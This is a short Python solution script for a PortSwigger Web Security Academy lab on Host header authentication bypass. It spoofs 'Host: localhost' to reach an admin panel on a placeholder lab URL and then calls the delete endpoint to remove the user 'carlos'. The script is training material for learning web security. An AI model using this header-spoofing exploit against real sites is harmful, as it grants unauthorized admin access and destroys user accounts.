"""
Lab 2: Host header authentication bypass
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass
Difficulty: Apprentice

📝 /admin grants access based purely on the Host header matching
"localhost" — treating that as proof the request came from the server
itself. Just set the header; no real authentication involved.
"""

from utils import get_session, request_with_host, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"


def run():
    s = get_session()

    note("Confirming /admin is normally inaccessible.")
    r = s.get(f"{TARGET}/admin")
    log(f"Normal /admin status: {r.status_code}")

    note("Retrying with Host: localhost.")
    r = request_with_host(s, "GET", f"{TARGET}/admin", host_header="localhost")
    log(f"Host:localhost /admin status: {r.status_code}")

    if r.status_code == 200:
        log("Access granted — deleting carlos.")
        r = request_with_host(
            s, "GET", f"{TARGET}/admin/delete",
            host_header="localhost",
            params={"username": "carlos"},
        )
        log(f"Delete status: {r.status_code}")
    else:
        note("If this fails, try '127.0.0.1' instead of 'localhost', or")
        note("check the error text from the first request — it often names")
        note("exactly which Host value is expected.")


if __name__ == "__main__":
    run()
